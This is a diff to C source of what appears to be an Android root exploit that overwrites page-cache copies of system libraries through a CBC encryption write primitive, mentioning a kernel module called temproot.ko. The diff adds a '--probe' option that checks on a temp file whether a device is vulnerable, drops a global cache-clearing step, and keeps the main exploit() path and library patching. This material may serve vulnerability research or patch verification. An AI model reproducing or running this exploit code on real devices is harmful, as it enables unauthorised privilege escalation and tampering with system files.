@@ -27,6 +27,7 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+static int      g_probe;
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -391,14 +392,8 @@ static void cleanup(void) {
         patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
                        (size_t)g_libcxx_r.shell_off, 0);
     }
-
-    printf("clearing page cache...\n");
-    sync();
-    int drop_fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
-    if (drop_fd >= 0) {
-        write(drop_fd, "3\n", 2);
-        close(drop_fd);
-    }
+    /* crash_dump64's patched page is dropped by temproot.ko via
+     * invalidate_inode_pages2(); a global drop_caches from this uid cannot work. */
 }
 
 int find_hook_target(const char *lib, const char *sym,
@@ -503,7 +498,7 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX [--probe]\n", argv0);
 }
 
 static int setup(int argc, char **argv) {
@@ -522,6 +517,8 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--probe"))
+            g_probe = 1;
         else { usage(argv[0]); return 2; }
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
@@ -626,12 +623,71 @@ static int do_revert(void) {
     return 0;
 }
 
+/* Non-destructive exploitability probe.
+ * Writes a known 16-byte pattern into the page cache of a private temp file
+ * using the same CBC primitive the exploit uses, then reads it back.
+ * 0 = vulnerable (page cache changed), 1 = patched (writes landed on a copy),
+ * 2 = inconclusive (setup failed).
+ */
+static int do_probe(void) {
+    printf("=== probe ===\n");
+    const char *dir = getenv("TMPDIR");
+    if (!dir || !*dir) dir = "/data/local/tmp";
+
+    char path[256];
+    snprintf(path, sizeof(path), "%s/tr_probe_XXXXXX", dir);
+    int fd = mkstemp(path);
+    if (fd < 0) {
+        printf("probe: mkstemp in %s failed: %s\n", dir, strerror(errno));
+        return 2;
+    }
+
+    const uint8_t orig[16]    = {'T','R','_','P','R','O','B','E','_','A','A','A','A','A','A','A'};
+    const uint8_t desired[16] = {'T','R','_','P','R','O','B','E','_','B','B','B','B','B','B','B'};
+    int rc = 2;
+
+    if (write(fd, orig, sizeof(orig)) != (ssize_t)sizeof(orig)) {
+        printf("probe: write failed: %s\n", strerror(errno));
+        goto out;
+    }
+    fsync(fd); /* page must exist before it is spliced */
+
+    if (patch_file_cbc(path, (const char *)desired, sizeof(desired), 0, 0) < 0) {
+        printf("probe: primitive failed\n");
+        goto out;
+    }
+
+    uint8_t got[16] = {0};
+    if (pread(fd, got, sizeof(got), 0) != (ssize_t)sizeof(got)) {
+        printf("probe: read back failed: %s\n", strerror(errno));
+        goto out;
+    }
+
+    if (!memcmp(got, desired, sizeof(got))) {
+        printf("probe: page cache modified -> VULNERABLE\n");
+        rc = 0;
+    } else {
+        printf("probe: page cache unchanged -> PATCHED\n");
+        rc = 1;
+    }
+
+out:
+    close(fd);
+    unlink(path);
+    return rc;
+}
+
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     if (argc > 1 && !strcmp(argv[1], "--revert")) {
         return do_revert();
     }
     if (setup(argc, argv) != 0) return 2;
+    if (g_probe) {
+        int rc = do_probe();
+        cleanup();
+        return rc;
+    }
     int rc = exploit();
     cleanup();
     return rc;
